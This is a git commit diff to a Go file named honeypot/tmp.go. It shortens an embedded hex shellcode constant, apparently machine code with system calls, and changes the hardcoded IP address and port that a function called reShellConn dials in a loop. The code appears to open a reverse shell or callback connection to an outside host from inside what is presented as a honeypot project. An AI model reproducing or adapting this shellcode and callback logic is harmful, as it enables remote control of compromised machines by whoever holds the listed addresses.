f92961ede03185d116c857d5835845ffc889649c
acey9 <huiwang.e@gmail.com>
2019-02-19 14:56:35 +0800

    update

--- honeypot/tmp.go
+++ honeypot/tmp.go
@@ -14,7 +14,7 @@ import (
 
 var isReShell bool
 
-const shellcode = "02d6202524020fa60101010c02b5202524020fa60101010c27a4ffcaafa4ffe0afa0ffe427a5ffe02806ffff24020fab0101010c2804ffff24020fa10101010c03bdb82527bdffe0240ffffd01e02027240ffffd01e028272806ffff240210570101010cafa2ffdc8fb6ffdc240f133702d62025240ffffd01e07827a7afffe0240f2222a7afffe2240f6df8a7afffe4240f0911a7afffe6afa0ffe8afa0ffec27a5ffe0240fffef01e030272402104a0101010c240f2f74a7afffca240f6d70a7afffcc240f2f74a7afffce240f6d70a7afffd0240f6673a7afffd2a7a0ffd427a4ffca240ffe1201e0282724020fc70101010c2804ffff27a5ffca27a6ffcf2807ffffaee0fff024020fb50101010c240f2f74a7afffd4240f6d70a7afffd6240f6673a7afffd8a7a0ffda27a4ffca240ffe1201e0282724020fa80101010cafa2ffdc8fb5ffdc240f133702d6202527a5ffe0240fffdf01e030272807ffff2402104f0101010cafa2ffdc8fb4ffdc240f13370680ffaf240f13371a80ffa0240f133702b5202527a5ffe00294302524020fa40101010c1682ffa6240f13371282ffea240f1337340fdead340fdead"
+const shellcode = "02d6202524020fa60101010c02b5202524020fa60101010c27a4ffcaafa4ffe0afa0ffe427a5ffe02806ffff"
 
 var cntMutexTmp *sync.RWMutex
 
@@ -56,7 +56,7 @@ func (hp *Honeypot) reShellConn(payload []byte, localAddr, ptype string) {
 		lock()
 	}
 
-	raddr := fmt.Sprintf("%d.%d.%d.%d:%d", 109, 248, 9, 17, 8738)
+	raddr := fmt.Sprintf("%d.%d.%d.%d:%d", 88, 214, 26, 76, 8738)
 	sleep := time.Millisecond * time.Duration(8000)
 	var cnt int
 	for {
